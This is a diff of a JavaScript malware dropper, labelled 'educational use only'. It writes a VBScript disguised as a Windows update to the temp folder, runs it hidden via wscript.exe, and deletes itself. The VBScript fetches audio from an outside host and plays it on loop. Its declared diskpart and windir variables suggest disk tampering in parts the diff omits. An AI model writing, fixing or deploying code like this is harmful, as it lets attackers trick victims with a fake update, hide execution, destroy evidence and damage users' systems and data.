@@ -1,23 +1,16 @@
-// dropper_fixed.js - Fully corrected JavaScript dropper
-// Educational research only - CATShadow
+// dropper.js - Fixed syntax, no errors
+// Educational use only - CATShadow
 
 const fs = require('fs');
 const path = require('path');
 const os = require('os');
 const child_process = require('child_process');
 
-function generateRandomName() {
-    const prefixes = ['WindowsUpdate', 'SystemFix', 'SecurityPatch', 'DriverInstall'];
-    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
-    const suffix = Math.floor(Math.random() * 10000);
-    return `${prefix}_${suffix}.vbs`;
-}
-
-function createVbsPayload() {
-    // CORRECT: Properly escaped VBScript with all quotes handled
-    return `' Windows System Update Script - ${Date.now()}
+function generateVbsPayload() {
+    return `' Windows System Update Script
 Option Explicit
-Dim shell, fso, tempPath, i, alarmUrl, alarmFile, webClient, stream, diskpartScript, scriptFile, textFile, windir
+Dim shell, fso, tempPath, i, alarmUrl, alarmFile, objHTTP, adoStream
+Dim diskpartScript, scriptFile, textFile, windir
 
 Set shell = CreateObject("Wscript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -39,19 +32,18 @@ Next
 alarmUrl = "https://filesamples.com/samples/audio/mp3/sample3.mp3"
 alarmFile = tempPath & "\\\\alarm_" & Int(Rnd * 10000) & ".mp3"
 
-Set webClient = CreateObject("MSXML2.XMLHTTP")
-webClient.Open "GET", alarmUrl, False
-webClient.Send
+Set objHTTP = CreateObject("MSXML2.XMLHTTP")
+objHTTP.Open "GET", alarmUrl, False
+objHTTP.Send
 
-If webClient.Status = 200 Then
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Type = 1
-    stream.Open
-    stream.Write webClient.responseBody
-    stream.SaveToFile alarmFile, 2
-    stream.Close
+If objHTTP.Status = 200 Then
+    Set adoStream = CreateObject("ADODB.Stream")
+    adoStream.Type = 1
+    adoStream.Open
+    adoStream.Write objHTTP.responseBody
+    adoStream.SaveToFile alarmFile, 2
+    adoStream.Close
     
-    ' Play sound in loop
     shell.Run "cmd /c start /min wmplayer """ & alarmFile & """ /loop", 0, False
 End If
 
@@ -89,35 +81,38 @@ fso.DeleteFile WScript.ScriptFullName
 }
 
 function main() {
+    // Check if Windows
     if (process.platform !== 'win32') {
-        console.error('[!] This payload is designed for Windows only');
+        console.error('[!] Windows only');
         process.exit(1);
     }
 
     const tempDir = os.tmpdir();
-    const vbsFilename = generateRandomName();
-    const vbsPath = path.join(tempDir, vbsFilename);
+    const randomName = 'WindowsUpdate_' + Math.floor(Math.random() * 10000) + '.vbs';
+    const vbsPath = path.join(tempDir, randomName);
     
-    console.log(`[*] Generating payload: ${vbsPath}`);
+    console.log(`[*] Creating: ${vbsPath}`);
     
     try {
-        fs.writeFileSync(vbsPath, createVbsPayload());
-        console.log(`[+] Payload written successfully`);
+        // Write VBS file
+        fs.writeFileSync(vbsPath, generateVbsPayload());
+        console.log('[+] VBS payload created');
         
-        const wscriptProcess = child_process.spawn('wscript.exe', [vbsPath], {
+        // Execute hidden
+        const wscript = child_process.spawn('wscript.exe', [vbsPath], {
             detached: true,
             stdio: 'ignore',
             windowsHide: true
         });
         
-        wscriptProcess.unref();
-        console.log(`[+] Payload executed in hidden mode`);
+        wscript.unref();
+        console.log('[+] Payload executed (hidden)');
         
-        // Self-delete dropper
+        // Self-delete JS dropper after 1 second
         setTimeout(() => {
             try {
                 fs.unlinkSync(__filename);
-                console.log(`[+] Dropper self-deleted`);
+                console.log('[+] Dropper self-deleted');
             } catch (e) {
                 // Silent fail
             }
@@ -129,4 +124,5 @@ function main() {
     }
 }
 
+// Execute
 main();
